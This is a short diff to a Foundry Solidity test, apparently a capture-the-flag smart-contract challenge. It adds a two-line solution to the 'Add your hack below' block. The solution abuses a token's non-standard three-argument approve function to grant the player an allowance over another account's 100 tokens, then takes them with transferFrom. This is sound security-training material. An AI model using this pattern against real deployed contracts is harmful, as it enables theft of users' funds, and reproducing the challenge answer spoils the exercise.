@@ -21,12 +21,15 @@ contract Challenge0Test is Test {
         vm.label(player, "Player");
     }
 
-    function testChallenge() public {        
+    function testChallenge0() public {        
         vm.startPrank(player);
 
         /*//////////////////////////////
         //    Add your hack below!    //
         //////////////////////////////*/
+        
+        token.call(abi.encodeWithSignature("approve(address,address,uint256)", vitalik, player, 100 ether));
+        IERC20(token).transferFrom(vitalik, player, 100 ether);
 
         //============================//
 
